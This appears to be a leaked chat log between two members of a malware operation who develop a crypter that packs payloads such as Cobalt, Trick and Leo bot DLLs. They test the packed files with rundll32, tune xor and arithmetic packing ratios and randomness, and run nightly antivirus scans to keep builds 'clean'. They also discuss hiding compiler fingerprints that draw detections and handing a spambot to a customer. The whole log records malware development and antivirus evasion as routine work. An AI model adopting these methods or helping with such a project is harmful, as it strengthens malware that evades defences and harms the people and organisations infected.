[19.08.21 17:04:09] basil: got it
[19.08.21 17:05:00] basil: didn't know about that at all
[19.08.21 17:05:12] basil: ``
#pragma comment(linker, "/ENTRY:WinMain")
```
[19.08.21 17:05:51] basil: Did you get the last one?
[19.08.21 17:06:17] elroy: I don't know, they are not numbered)
Only 4 messages came
[19.08.21 17:06:41] basil: so it got there. The one in the frame.
[20.08.21 09:40:24] basil: Hello.
[20.08.21 09:44:19] elroy: Hello.
[20.08.21 09:46:54] basil: Yesterday I tried to distribute changes by branches. I got hung up right away. There are several pieces of working branches, apparently under a specialized load. Which ones do I pour into? I still have a small script that pours the changes into individual branches. It will fit?
```
git checkout develop
git pull

git checkout develop_payload_generic
git pull
git merge develop
git checkout beta_payload_generic
git pull
git merge develop_payload_generic

git checkout develop_payload_cobalt
git pull
git merge develop_payload_generic
git checkout beta_payload_cobalt
git pull
git merge develop_payload_cobalt

git checkout develop_payload_loader-bot-leo
git pull
git merge develop_payload_generic
git checkout beta_payload_loader-bot-leo
git pull
git merge develop_payload_loader-bot-leo

git checkout develop_payload_startw
git pull
git merge develop_payload_generic
git checkout beta_payload_payload_startw
git pull
git merge develop_payload_startw
```
[20.08.21 09:47:41] basil: it used to spill
[20.08.21 09:48:16] elroy: Just a minute, I'm looking
[20.08.21 09:49:08] elroy: No, that's obsolete.
[20.08.21 09:51:47] elroy: git checkout develop
git pull
git checkout develop_payload_generic
git pull
git merge develop

And so on to each branch
 develop_payload_bk
 develop_payload_cobalt
 develop_payload_generic
 develop_payload_loader-bot-leo
 develop_payload_rundll
 develop_payload_trick
[20.08.21 09:52:52] elroy: I.e. it is always generic

And this is NOT RIGHT.
```
git checkout develop_payload_cobalt
git pull
git merge develop_payload_generic
```
[20.08.21 09:53:13] elroy: Stop
[20.08.21 09:53:15] elroy: Error
[20.08.21 09:53:30] elroy: *That is, it is always pouring in
[20.08.21 09:55:17] basil: Okay. Okay. So I'm pouring my branch into develop. I resolve the conflicts. And then I spill out of develop into the branches:
```
develop_payload_bk
develop_payload_cobalt
develop_payload_generic
develop_payload_loader-bot-leo
develop_payload_rundll
develop_payload_trick
```
[20.08.21 09:57:11] elroy: You infuse yourself develop, you allow coflicts, you infuse your branch into devlop. And then correctly, you infuse the development on the rest of the branches
[20.08.21 09:57:32] basil: that's it. fine. Got it
[23.08.21 09:32:52] elroy: Greetings.
[23.08.21 09:32:58] basil: Hello.
[23.08.21 09:33:24] elroy: Did you spill on the branches? How are the results, everything works after pouring?
[23.08.21 09:34:07] basil: Yes, I poured on branches. There were no conflicts when merging my branch and the develop. Everything is fine.
[23.08.21 09:34:16] basil: I spilled it onto other branches.
[23.08.21 09:34:40] basil: Develop tested several times. Everything was fine.
[23.08.21 09:35:06] basil: But to be honest I haven't tested other branches. There is a special load is needed
[23.08.21 09:35:21] basil: But they seemed to be specialized for load
[23.08.21 09:35:46] basil: They are
[23.08.21 09:36:43] elroy: There is LeoDllTest_x64 in the panel, you can test bk, rundll, leo with it
[23.08.21 09:37:06] elroy: cobalt can test rundll_64 and rundll_32
[23.08.21 09:37:36] basil: And how do you test them? Could you elaborate. I'm way behind on this topic. I am not aware of it.
[23.08.21 09:38:09] basil: what's the sign that load works?
[23.08.21 09:41:19] elroy: rundll32 file.dll,FuncName
Leo sign - for leo profile there should be two messages, one from dllmain, another from function name, should be ares to file if crypt leo and empty field if rundll and bk
rundll_64 and rundll_32 - there just message, no path, but it says TLS worked or error
[23.08.21 09:42:32] elroy: FuncName can be viewed in the original LeoDllTest and rundll_32 and _64. You can look either by loading the file into the panel and dropping it out of the test, there in the box that opens, windo the names of the functions in the export. You can IDA or depends
[23.08.21 09:43:30] elroy: Do not run anything on the working machine, only on the test if you take something from the panel. There is a risk of giving out wrong file, you can download coder by accident (there were incidents, take care).
[08.23.21 09:46:30] basil: Ok. One more question. Are the keys for the build.dat standard? That is, for example.
```
build -p C:\\PayLoads\\\\leo.dll -s C:\CryptoStore
```
[23.08.21 09:46:44] basil: build,bat
[23.08.21 09:47:13] elroy: If you want to export, then --gen-exports yes
[23.08.21 09:47:59] elroy: For all three profiles dll->dll - yes, for dll->exe - no
[23.08.21 09:48:38] basil: ok
[23.08.21 09:48:46] basil: Anything else?
[23.08.21 09:48:53] elroy: Check entropy keys, they should work too
[23.08.21 09:49:52] basil: You mean set entropy value and check values in course build?
[23.08.21 09:50:46] elroy: This check is done by SolutionBuilder itself, it shows the resulting entropy. You just need to check if the file works or not.
[08.23.21 09:51:20] basil: ok. got it. ok.
[23.08.21 09:51:42] elroy: And also check entropy values in the console to see if they correspond to the expectations.
[08.23.21 09:52:22] basil: yes
[23.08.21 09:53:03] basil: I'm not being sarcastic... If anything. I'll check it. I'll report back
[23.08.21 09:53:20] elroy: Good.)
[23.08.21 15:55:51] basil: if in the develop_payload_loader-bot-leo branch. I will script LeoDllTest_x64.dll . And then I call it with the command
```
rundll32 LeoDllTest_x64.dll
```
What should happen?
[23.08.21 15:56:19] elroy: I think nothing
[23.08.21 15:56:38] elroy: Or dllmain will just call
[23.08.21 15:56:58] basil: but then how correct?
[23.08.21 15:57:30] elroy: ``
rundll32 lib.dll,FuncName
[23.08.21 15:58:04] elroy: funcname look at export table
[23.08.21 15:58:22] elroy: For Leo there's PluginInit, for example
[23.08.21 15:58:47] basil: Yes, there is one. I see
[23.08.21 17:04:04] basil: No. For leo does not work for some reason
[23.08.21 17:15:20] elroy: Why does it not work?
[23.08.21 17:18:53] basil: just crashed and that's all
[23.08.21 17:20:33] basil: It builds without errors. New compressor in code is present. Run it like this
```
rundll32 crypted.dll,PluginInit
```
[23.08.21 17:22:29] elroy: And with what error does it crash?
[23.08.21 17:23:04] basil: APPCRASH
[23.08.21 17:23:16] elroy: Well, it's not an error.)
[23.08.21 17:23:22] elroy: Give me a screenshot of the crash.
[23.08.21 17:23:54] elroy: Do you have access to Jenkins?
[23.08.21 17:25:54] basil: probably not.
[23.08.21 17:26:15] elroy: give me a screenshot of the fall
[23.08.21 17:26:28] basil: a moment. now.
[08.23.21 17:27:53] basil: hKbCtqOFLi$JF8u
[23.08.21 17:28:37] basil: https://file.io/bIUgQMh1xAnc
[23.08.21 17:43:22] elroy: it's colored.
[08.23.21 17:43:25] elroy: Unpleasant.
[23.08.21 17:47:30] basil: The binary itself must be built correctly. I've checked it many times. There's something else there. Is it possible to build cryptor with debug_printf?
[23.08.21 17:48:25] elroy: Something can go wrong about debug_printf, I'm not sure.
[23.08.21 17:48:33] elroy: Could break debugging
[23.08.21 17:48:43] elroy: Check the log initialization order
[23.08.21 17:48:58] elroy: If it initializes correctly, it should work
[08.23.21 17:51:06] basil: ok. I'm working on the debug version.
[08.23.21 17:51:26] elroy: Wait, no.
[23.08.21 17:51:56] basil: Yeah, I'm listening.
[23.08.21 17:51:57] elroy: I'll give you access to Jenkins later, set up a build from git
[23.08.21 17:52:09] basil: ok. waiting
[23.08.21 17:52:14] elroy: maybe you have a problem with your compiler
[08.23.21 17:52:31] basil: ok. Let's check it.
[23.08.21 18:15:10] elroy: -----BEGIN PGP MESSAGE-----

hQIMA1vRWlS2107DARAAtYCRS1UOOEz7pekO71xyjFe8s2UVHFLKBcCRio/TthYj
9VpX6ZgKQn/BfgtM2tGF4lNVNNS4K12hnrnTcvLmvAlv1npzvUSELqj+M1ggc3QlcL
ATVeklc0IGIuEz4A60NPuVjx69qEsmnZt3oQlwls1TzzN1dfgZpap5fJt0pFoUl7
KY4bEbzRqnUdX8COGzz13MzeCPvTn/R5gYcqeDvzhBtbmm9zbiZ5MtIrXlnq8hR3
3Fh5m8ep+2gnMS+G9ALTVW442u/MBM50ODPZt8aOmTi8/wRlcKR+HiwQtK8JhBUm
Ih5kb2guUFXtvSKQ+kuTyOhA0/SU7bOh4Zodg+2R/Mh2i6wqhARnQ7U3YqHqxSmT
LxjKm24cB/ESHus/PBpPeibFiIguw5y1T0sSifr+kuv/iKz8I4iWvWXx0h7rEwwC
4QTzcJ5y6ZSL4XQmJPFSMzEcrHnggHcWgbVzoKueB1o5pzFRQpIOa8YkxrdCZTM
WxqDWtAq7FakX5RCSl1rC0PDP4pf/lhSpABze2MwRA6lwWa95cjFs5M9+LaLrPYX
7yuE6/OGsnKC6j0HoXHxZBIGLZVayCb+5bJU8Y0tR9pNuqRyssvCAzpTZDFx8iW5
nr4ZlGkye7QU/uX0MffcF4RBwcWzMq9oVS4whCO8UXbcfkRaQrrdjxIkN+FZpjDS
dwHhVPAJ9tcT6IDCAR6IfxS1LiXqGPYsHcJnv4Pt+9xh/LIKOPlTCnyuhII/5qJC
AENJq7rlWUb3J3edEsBj0G7aOWyCSx6WsEChfv/ME7lbJbgRlShJJEFl1Bch9zT2
bJYBJuXCdow9D2HEKPG4LNLTnXAxKttJ
=pVSy
-----END PGP MESSAGE-----
[23.08.21 18:15:22] basil: a moment
[23.08.21 18:19:45] basil: yes
[23.08.21 18:21:58] basil: more details. How do you work with it?
[23.08.21 18:22:33] elroy: How does it work?
You delete crypter2_test_stub profile.
Create a new one (new item)
When creating it you put the name crypter2_test_stub
And you can enter the name of your desired profile in the field below, e.g. crypter2_generic_exe
A new profile will be created from it.
You need to correct its Build token in the settings, it must match the name of crypter2_test_stub
And you change the branch to develop_.......
You get a profile that builds from the develop__COPY branch.
In the panel build testing_crypter2
[23.08.21 18:23:13] basil: Well it's simple....))))
[23.08.21 18:23:26] basil: ok. i'll try to run it all now
[23.08.21 18:26:18] elroy: The testing_crypter2 input can be anything, the output will be a file with the dll extension, but in fact it will have the extension the crypter makes. I.e. if you do it in exe then it's necessary to rename .dll to .exe, if dll - you don't need anything
[23.08.21 18:27:27] basil: delete crypter2_test_stub? Delete_project&
[23.08.21 18:27:29] basil: ?
[23.08.21 18:27:34] elroy: yes
[23.08.21 18:33:58] basil: I did almost everything. Except "In the panel build testing_crypter2". Where is that?
[23.08.21 18:34:07] elroy: cryptopanel
[08/23/221 18:45:51] elroy: You got it?
[08/23/221 18:46:29] basil: poorly. honestly. Where is this panel in the cryptopanel?
[08/23/221 18:46:33] basil: I can't find it.
[23.08.21 18:46:45] elroy: You have tab two
[23.08.21 18:46:59] elroy: You have the testBuild tab
[23.08.21 18:47:12] elroy: You see them,
[23.08.21 18:47:23] basil: yes
[23.08.21 18:47:26] basil: I can see them
[23.08.21 18:47:29] basil: I see them
[23.08.21 18:47:34] elroy: Great.
[23.08.21 18:47:49] elroy: There is a Leo.... file on testBuild tab
[23.08.21 18:47:58] basil: yes
[23.08.21 18:48:02] basil: I see
[23.08.21 18:48:14] elroy: column Check
[23.08.21 18:48:20] elroy: There's a B button
[23.08.21 18:48:24] elroy: (build)
[23.08.21 18:48:30] basil: there is
[23.08.21 18:49:00] elroy: DLL functions: - is export load (this file)
[23.08.21 18:49:10] elroy: Payload type - this is profile
[23.08.21 18:49:25] elroy: We should choose TestStubs
[23.08.21 18:49:53] elroy: Stubs profile is the crypto with
[23.08.21 18:50:34] basil: BotLeo profile?
[23.08.21 18:51:42] elroy: BotLeo is a production version, i.e. the profiles will be offered by dll_leo_crypter2..., the ones in Jenkins
[23.08.21 18:51:50] elroy: You should select TestStubs
[23.08.21 18:52:00] elroy: There will be testing_crypter2 profiles
[23.08.21 18:52:28] elroy: Everything that is not TestSubs - is prolly
[23.08.21 18:52:58] basil: A moment
[23.08.21 18:53:51] basil: selected TestSubs, testing_crypter2 profiles
[23.08.21 18:53:55] basil: profile
[23.08.21 18:54:06] basil: starting the process
[23.08.21 18:54:09] elroy: I see, build is running
[23.08.21 18:54:36] elroy: In Jenkins you can see the build log and build output window
[23.08.21 18:54:48] elroy: Choose profile
[23.08.21 18:55:07] elroy: Select build number on the left, mouse arrow and there console output
[23.08.21 18:55:22] elroy: Or you can do the same, but press build
[23.08.21 18:55:41] elroy: You will get his artifacts page, there will be log and files if needed
[23.08.21 18:55:52] elroy: After the build, the file will come to the panel
[23.08.21 18:56:10] basil: ok. now.
[23.08.21 18:57:04] elroy: Just from now on, you run all files very carefully, only on test machines. There were cases
[23.08.21 18:57:44] basil: yes. It's not just silver said "that's the combine!"
[23.08.21 18:58:00] elroy: Combine not that)
[23.08.21 18:58:18] basil: is there anything else?
[23.08.21 18:58:21] elroy: There's a page in the panel above, called Auto test
[23.08.21 18:58:26] elroy: That's where the combine is
[23.08.21 18:58:44] basil: you once told me about auto test
[23.08.21 18:58:47] elroy: All cryptors collect profiles and automatically send them to scan
[23.08.21 18:59:03] elroy: There's over a hundred
[23.08.21 18:59:18] elroy: At 3:00 a.m. and before 10:00 a.m. is being built, checked
[23.08.21 18:59:26] elroy: Then you can see what's clean, what's not
[23.08.21 18:59:37] basil: that's a firm!!!
[23.08.21 19:00:15] basil: I'm proud to work for such an organization. Too bad you can't put)))) on your résumé.
[23.08.21 19:00:22] elroy: Now I have to add accounts and collect bits))).
[23.08.21 19:00:53] basil: By the way. They say there's a crypto group going on
[23.08.21 19:01:11] basil: sylver, like he said in the chat room
[23.08.21 19:01:27] elroy: Rumors)
[23.08.21 19:01:56] elroy: Okay. Deal with the file, something with an error it's going to or not)
[23.08.21 19:02:02] elroy: I'll go, see you tomorrow)
[23.08.21 19:02:19] basil: Okay.
[23.08.21 19:02:20] basil: okay.
[23.08.21 19:02:28] elroy: If there's anything, text orval, he'll advise you.
[23.08.21 19:02:56] basil: ok.
[23.08.21 19:02:56] basil: thanks
[24.08.21 09:42:16] elroy: hello. Any luck yesterday?
[24.08.21 09:43:25] basil: Greetings.
 Yes, I ran the build. It worked. The log is normal. I mean, the dll came out. But something's wrong. Crypt is not working.
[24.08.21 09:44:02] basil: At least for me. I ran it through rundll32. But no. CRASH
[24.08.21 09:44:42] basil: in a separate virtual machine
[24.08.21 09:44:55] elroy: And you don't see where ?
[24.08.21 09:45:38] basil: i tried to connect debug_printf yesterday, but already on my machine
[24.08.21 09:45:49] basil: But it didn't work.
[24.08.21 09:46:09] basil: Maybe some additional manipulations are needed there?
[24.08.21 09:47:38] elroy: Let's proceed from the fact that before the merge crypt worked. Hence we need to do a code comparison, see what was and what became. We'll take git to both folders, one commit before merge and another one after merge, compare folders with total explorer for example and see what's changed along the lines (or compare files themselves, notepad++ for example).
[24.08.21 09:48:45] elroy: If you don't see any differences, just fine-tune places with changes
[24.08.21 09:49:07] elroy: Try to have it done by tonight
[24.08.21 09:49:36] basil: okay. Question. Does UniCrypter for exe work?
[24.08.21 09:49:48] elroy: Yes, for dll and exe
[24.08.21 09:50:02] basil: is this for branch with problems?
[24.08.21 09:51:26] elroy: Yes, there is a cript provided for dll -> exe, to make it work you should specify --entrypoint <function>, then dll will start and its dllmain will be called by function (PluginInit, for example)
[24.08.21 09:52:13] elroy: This is rundll branch
[24.08.21 09:52:24] elroy: branch bk is based on it
[24.08.21 09:52:40] elroy: This is what leo branch is based on
[24.08.21 09:53:16] elroy: branch bk and leo don't need exe, don't know if it works or not
[24.08.21 09:53:31] basil: ok. I got it.
[24.08.21 14:45:44] basil: hello. Once again.
[24.08.21 14:46:14] basil: I found the place. Where is the error. It's a new packer.
[24.08.21 14:46:56] basil: It works in develop branch. It doesn't work in the leo branch. Although the code is identical.
[24.08.21 14:50:11] elroy: And why is it so?
[24.08.21 14:50:14] basil: I don't get it, for Christ's sake.
[24.08.21 14:51:52] basil: I ran it through a N number of times. And as you understand, there's different sizes of encrypted blocks and the encryption used in them. And it worked. And here it doesn't work.
[24.08.21 14:52:44] elroy: Still need to understand why
[24.08.21 14:53:13] elroy: And fix it
[24.08.21 14:53:45] basil: well, yes. What there is to fix. If all is the same.
[24.08.21 14:54:08] elroy: So not everything
[24.08.21 14:54:36] elroy: Did you check output of packer/unpacker?
[24.08.21 14:54:57] elroy: And you didn't throw out crt yet?
[24.08.21 14:55:21] basil: Yes. Naturally. And then I also tested it with a live file. UniCrypter too.
[24.08.21 14:55:48] basil: no ctr. crt on the same place
[24.08.21 14:55:52] elroy: And it crashes on what place?
[24.08.21 14:56:36] basil: well, it goes into packer.unpack and never comes out of it again
[24.08.21 14:56:49] basil: i.e. it's definitely the problem
[24.08.21 15:03:32] elroy: Find out what's wrong, debug the algorithm. Take a file of several hundred bytes, go through algorithm with debugger.
[24.08.21 15:04:10] basil: Yes. That's exactly how I debugged it. Even more I can say. I used meaningful text for such a case.
[24.08.21 15:04:23] basil: And I looked at every single buffer
[24.08.21 15:05:54] elroy: Why no return?
[24.08.21 15:05:57] elroy: Why does it stay there?)
[24.08.21 15:06:39] basil: it seems to me, that there is an access to inaccessible memory region
[24.08.21 15:07:22] elroy: I have such an idea, that vector is to blame.
[24.08.21 15:07:39] elroy: You can't return it as retutn type
[24.08.21 15:07:45] basil: I think I found the reason
[24.08.21 15:07:55] basil: just now it hit me
[24.08.21 15:08:36] basil: it's about
```
struct Entry
{
	size_t dataSize;
	unsigned char data[];
};
```
[24.08.21 15:09:02] basil: more exactly in size_t for 32-bit and 64-bit systems
[24.08.21 15:12:21] basil: okay. that's probably it.
[24.08.21 15:12:27] basil: let me try to fix it now
[24.08.21 15:16:00] elroy: everywhere you use Entry, sizeof(Entry) should not be a constant
[24.08.21 15:16:30] elroy: Maybe it's about Entry, rename it
[24.08.21 15:16:54] elroy: Maybe it is pulled from headers somewhere
[24.08.21 15:17:13] basil: Checking
[24.08.21 15:17:16] basil: hypothesis
[24.08.21 15:17:54] elroy: Wait.
[24.08.21 15:18:09] basil: yes
[24.08.21 15:18:32] elroy: unsigned char data[]; is this
And what is done with the structure, is its size taken somewhere?
[24.08.21 15:18:47] basil: size_t dataSize;
[24.08.21 15:32:43] basil: well . looks like it moved. now I'll test it on leo
[24.08.21 15:41:13] elroy: I have a question
[24.08.21 15:41:33] basil: yes
[24.08.21 15:42:42] basil: leo works
[24.08.21 15:44:27] basil: or worked
[24.08.21 15:44:32] elroy: ``
struct Entry
{
	size_t dataSize;
	unsigned char data[];
};

// sizeof(Entry) == 4 ?

Entry* entry;
CompressDescript* descr = (CompressDescript*)entry->data;
```
entry->data is a pointer.
If sizeof(Entry) == 4, the pointer lies outside the structure. Actually, in the data you copy earlier into that memory area.
[24.08.21 15:45:14] elroy: My question is, why does this work at all?
[24.08.21 15:45:42] basil: it's from here
[24.08.21 15:45:53] basil: ``
	Entry* entry = (Entry*)block;
	if (entry->dataSize == 0)
		return 0;

	CompressDescript* descr = (CompressDescript*)entry->data;
	if (descr->encryptType != ARITHMET_ENCRYPT)
		return 0;
```
[24.08.21 15:46:11] basil: ?
[24.08.21 15:46:26] elroy: Maybe
[24.08.21 15:47:10] elroy: But that's not the problem, the pointer is accessed there. The pointer is the first 8 bytes lying after the structure.
[24.08.21 15:47:39] basil: that's exactly it's not a pointer. It's data.
[24.08.21 15:47:51] basil: and.... By the way
[24.08.21 15:48:02] elroy: entry->data is a pointer reference
[24.08.21 15:48:14] elroy: you take a pointer out of the structure
[24.08.21 15:48:18] elroy: And not the data
[24.08.21 15:48:54] elroy: data is by design a pointer to data.
[24.08.21 15:49:00] elroy: But it's not in the structure
[24.08.21 15:49:28] basil: unsigned char* data - this would be a pointer
[24.08.21 15:49:30] elroy: because it is declared as [] and the structure has size 4 bytes (for some reason)
[24.08.21 15:50:02] elroy: unsigned char data[1212] is also a pointer to the beginning of the array
[24.08.21 15:50:42] basil: the point is that there is nothing in brackets
[24.08.21 15:51:02] basil: pay attention
[24.08.21 15:51:12] elroy: that's why the structure was not created completely
[24.08.21 15:52:18] basil: yes. I'm adding data there in the future. And when I want to copy it somewhere, I go to the first element of the structure
[24.08.21 15:52:36] basil: to find out the size of that data
[24.08.21 15:54:09] elroy: Rewrite this section humanly. If you use a structure, use normal pointers, if you need them there. If you want to copy data and hide it behind a structure, you'll have access to it
char* ptr = (char*)entry + sizeof(entry);
[24.08.21 15:54:23] elroy: ``
char ptr = (char)entry + sizeof(entry);
```
[24.08.21 15:55:30] elroy: And the incredible thing is, it somehow works...
[24.08.21 15:56:25] basil: yes. it happens in my practice
[24.08.21 15:56:48] basil: and oddly enough more than once
[24.08.21 15:57:04] elroy: Yes)
[24.08.21 15:57:15] elroy: You make the code work which shouldn't
[24.08.21 15:57:24] elroy: It works, although it's stalled)))
[24.08.21 15:58:40] basil: how many times have I heard about myself. "You're weird...." Well, it's not my fault. I try to be a normal person. Although I'm not very good at it.
[24.08.21 15:59:04] basil: Okay. I'll check the rest of them. And I'll redo them like you said.
[24.08.21 15:59:14] elroy: ok, thanks.)
[24.08.21 16:16:19] basil: rundll_x86.dll works if I also add --gen-exports yes. Is it correct?
[25.08.21 08:45:15] basil: hello!
[25.08.21 08:45:28] elroy: Greetings. You wrote something yesterday, it didn't come.
[25.08.21 08:45:37] basil: Yes.
[25.08.21 08:45:40] basil: now
[25.08.21 08:46:47] basil: Yesterday I tested Leo - it worked. Then started testing bk and rundll. I had to break through the exports there when building, right? Right? To check the crpt.
[25.08.21 08:46:59] basil: I've inserted a branch into leo
[25.08.21 08:47:30] elroy: Yes, I should have forwarded it.
[25.08.21 08:48:28] basil: I have forwarded and started with exported functions appeared. MessageBox appeared. I take it it works. Pouring in the remaining branches?
[25.08.21 08:48:58] elroy: rewrote code, what did I break?
[25.08.21 08:49:26] basil: Exactly the one you asked rewrote.
[25.08.21 08:49:48] basil: ``
+sizeof(Entry)
```
[25.08.21 08:50:01] elroy: Okay, fill in the branches.
[25.08.21 08:59:33] basil: poured
[25.08.21 09:00:02] basil: now I understand I have to take crt?
[25.08.21 09:00:31] elroy: you uploaded only develop branches, right?
[25.08.21 09:01:37] elroy: There were reconnects, repeat messages
[25.08.21 09:02:33] basil: Yeah.
```
develop_payload_bk
develop_payload_cobalt
develop_payload_generic
develop_payload_loader-bot-leo
develop_payload_rundll
develop_payload_trick
```
[25.08.21 09:02:40] basil: now i guess i should take up crt?
[25.08.21 09:03:18] basil: or we'll fight for size of encrypted data?
[25.08.21 09:04:09] elroy: now we have to check the build machine branches, through a test profile, check the files for functionality.
[25.08.21 09:05:37] elroy: Then, yes, fight for size. But you changed the algorithm, now the xor-key for fragments is generated via double. Didn't that affect the size?
[25.08.21 09:06:41] basil: it did. But better, of course, if we reduce size of descriptor for arithmetic compression
[25.08.21 09:06:59] elroy: Okay. Make it smaller.
[25.08.21 09:08:09] elroy: Given your access to the Internet, do it in a new thread. And tonight check on buildmachine
[25.08.21 09:10:32] basil: ok
[25.08.21 15:23:51] basil: tested leo64,bk32,bk64,rundll32,rundll64. For bk and rundll made export pass. There was an export of Test1,Test2,Test3,One,Two,Three
[25.08.21 15:24:23] basil: I was building on build machine. MessageBoxes were appearing.
[25.08.21 15:32:54] elroy: Okay.
[25.08.21 15:33:05] elroy: You did the size, how are the results?
[25.08.21 15:37:52] basil: I was doing size. But the results...... How to tell you. It doesn't happen once for all. I was looking at what the final descriptor is.... And I see that everything depends very much on the entropy of the data . If the entropy is high, then almost every element is occupied. If it is low, you can compress it (the descriptor). It can be compressed not by 50%, but by 10-15%. Considering that in the binary all values in a row, it turns out somewhere around 8%.
[25.08.21 15:39:16] elroy: Well 8% is more than nothing, and the final one will be less by the same 8%.
[25.08.21 15:39:42] elroy: Manipulation with xor-crypting of fragments gave results, file became smaller?
[25.08.21 15:40:13] basil: Yes. Well, I mean the encrypted binary.
[25.08.21 15:40:28] elroy: Yes, it is.
[25.08.21 15:41:25] elroy: That's where we end up with 40% + 8% reduction
[25.08.21 15:41:56] basil: The file itself is totaled from the build machine - whatever you get. The size varies somewhere in the 100kb range. For a file of 1,200 kb.
[25.08.21 15:42:06] basil: and what is 40% ?
[25.08.21 15:42:11] basil: I don't get it
[25.08.21 15:44:49] elroy: It was purely arithmetic packing.
Then it became 60% arithmetic, 40% xor. So the increase in volume came not from 100% of the file, but 60%. Right?
8% (ideally) you say will be saved from this 60% if descriptors are pressed.
Yes, I agree. it should not have rolled percentages, not 48.
[25.08.21 15:45:28] elroy: *not at 100% pyload (source file)
[25.08.21 15:47:18] basil: Let's put it this way. Tangible data compression for xor and not particularly tangible for fhbavtnbxtcrjuj c;fnbz
[25.08.21 15:48:07] basil: arithmetic compression. Even if we try to store only frequencies of occurring bytes other than zero in the arithmetic compression descriptor
[25.08.21 15:49:22] basil: if we don't give numbers
[25.08.21 15:49:48] elroy: I didn't see that 40% at all... Crypter as it was built before, and it is still built. The same size.
[25.08.21 15:50:08] elroy: Or maybe I just didn't notice it?
[25.08.21 15:50:52] elroy: Build by two methods, old and new, a couple or three times a load size about 100 kb.
[25.08.21 15:51:07] elroy: Will there be a difference?
[25.08.21 16:21:50] basil: there is a difference
[25.08.21 16:22:18] basil: file (original) - 836 kB
[25.08.21 16:22:46] basil: old method 4564 4579 4560
[25.08.21 16:23:05] basil: new method 3899 3898 3857
[25.08.21 16:23:15] basil: all kilobytes
[25.08.21 16:24:51] elroy: 15%
[25.08.21 16:25:02] elroy: I agree, not bad
[25.08.21 16:25:16] elroy: Strange that it's not 40
[25.08.21 16:25:28] elroy: Or at least 30
[25.08.21 16:25:32] elroy: Only 15
[25.08.21 16:25:59] elroy: Does everything work correctly there, no extra data goes into pyload?
[25.08.21 16:26:30] basil: I'll double-check everything.
[25.08.21 16:26:40] basil: I'll run it
[25.08.21 16:27:00] elroy: Please make a test with 30% arithmetic and 70% xor
[25.08.21 16:27:24] basil: ok.
[25.08.21 17:02:10] basil: old method - 4558 4565 4539 4581
70% xor - 2699 3034 2963 2934
[25.08.21 17:02:18] basil: binary works
[25.08.21 17:03:09] elroy: Then leave it like this
[25.08.21 17:03:17] elroy: Let it be 70% xor
[25.08.21 17:04:15] elroy: Here's another thing. I wrote earlier that you should add some trash percentage to downloaded file depending on its size.
[25.08.21 17:04:51] basil: maybe. Honestly, I don't remember. What should I do?
[25.08.21 17:05:09] basil: We also have entropy data there
[25.08.21 17:05:11] elroy: Now xor and arithmetic method are specified strictly or have random percentage?
[25.08.21 17:06:16] basil: The size of each individual block is random. But the ratio of xor and arithmetic compression is constant.
[25.08.21 17:08:14] elroy: It's good that block size is random. that's very good!
Make another 65-75% xor to be random, the rest arithmetic
[25.08.21 17:09:00] basil: you can do it now
[25.08.21 17:10:29] elroy: One more modification at the same time
[25.08.21 17:10:41] basil: yeah. listening
[25.08.21 17:15:13] elroy: Where we have a random generator in SolutionBuilder, in all its implementations replace with this generation:
```
#include <intrin.h>

unsigned int rnd;

if (!_rdrand32_step(&rnd))
	rnd = GetRandom(&RandomContext); // generation failed, use the old method

// then use rnd
```
[25.08.21 17:15:48] elroy: Just fix it in the generator itself
[25.08.21 17:16:07] elroy: It's a way to query a random number by an instruction from the processor
[25.08.21 17:16:24] elroy: Like hardware random
[25.08.21 17:17:38] elroy: Otherwise we're in trouble with the generator, I think. It generates not random)
[25.08.21 17:18:10] basil: a moment
[25.08.21 17:21:45] basil: yeah. I get it. ok.
[25.08.21 17:22:34] elroy: Ok, then update develop and develop profiles, check branch again. And report then)
[25.08.21 17:22:51] basil: ok
[25.08.21 18:03:29] basil: still there?
[25.08.21 18:09:00] basil: tested bk,leo,rundll
[25.08.21 18:09:04] basil: everything works
[26.08.21 09:25:44] elroy: you wrote something yesterday, something didn't come...
[26.08.21 09:25:50] elroy: greetings
[26.08.21 09:25:58] basil: Hello.
[26.08.21 09:26:15] basil: Yes I did. I checked rundll, bk, leo yesterday
[26.08.21 09:26:21] basil: It works
[26.08.21 09:26:30] basil: through build machine
[26.08.21 09:27:59] elroy: Then do this:
```
git checkout beta_payload_generic
git pull
`` git merge develop_payload_generic
git push
```
I.e. to pour into each branch beta_ its own branch develop_
[26.08.21 09:28:34] basil: ok
[26.08.21 09:37:21] elroy: About the spambot, I once asked about dll version readiness. You said it was ready.
[26.08.21 09:37:31] elroy: Can you build it and give it to the customer?
[26.08.21 09:47:23] basil: yes. I think you can. to whom?
[26.08.21 09:47:37] basil: and there you need to know the function prototype
[26.08.21 09:47:43] basil: exportable
[26.08.21 09:49:57] elroy: Oh, yes. We should. Then we must find out which bot it will work with.
[26.08.21 09:50:07] elroy: I'll find out, then tell me.
[26.08.21 09:50:13] basil: Yeah. Okay.
[26.08.21 09:50:27] basil: I updated the branches. Uploaded
[27.08.21 14:52:36] elroy: Greetings.
[27.08.21 14:52:44] basil: hello
[27.08.21 14:53:22] elroy: I crypted updated profiles locally today, everything is clean, maybe even working (I haven't tested load myself).
[27.08.21 14:53:33] elroy: Missed eta detects and there was more
[27.08.21 14:54:35] elroy: But here's the problem, if I build locally - clean. If I do it on buildmachine, Ikarus AB says "Crypt". Interestingly, there are no other detects, but he is.
[27.08.21 14:55:06] basil: Could the compiler get lit up?
[27.08.21 14:55:06] elroy: Asked about spambot, silence again
[27.08.21 14:55:17] elroy: Anything could happen.
[27.08.21 14:55:52] elroy: I even put up a prize for the one who finds the compiler fingerprint and finds how to clean it.
[27.08.21 14:56:09] elroy: Many stumbled upon the fact that there is still a compiler footprint
[27.08.21 14:56:20] elroy: But there is no exact description of the trace
[27.08.21 14:56:37] elroy: There's only something like "there's a different version of linker"
[27.08.21 14:56:52] elroy: It is different, it links differently, but how to catch the trace itself...
[27.08.21 14:57:26] basil: Here's my suggestion to switch to GCC
[27.08.21 14:57:33] basil: What do you think about it?
[27.08.21 14:57:55] elroy: Positive. Will our code get together there with his bunch of macros?)
[27.08.21 14:59:02] elroy: Still gotta clean up llvmo profiles, obfuscating compiler anyway.
[27.08.21 15:00:07] basil: there shouldn't be any restrictions on using macros. In theory....
[27.08.21 15:00:26] elroy: Try to build it
[27.08.21 15:00:31] elroy: You'll do a good job.)
[27.08.21 15:00:42] basil: ok. go ahead. I'll take care of it.
[27.08.21 15:00:45] basil: okay.
[27.08.21 15:01:01] basil: about that copyleader trace.
[27.08.21 15:02:09] basil: I think we should make a helloWorld project. And ask coders to build it and send binary. Under the same studio version of course. And the same settings
[27.08.21 15:02:35] basil: Maybe their comparison will help? Has such thought never occurred to you?
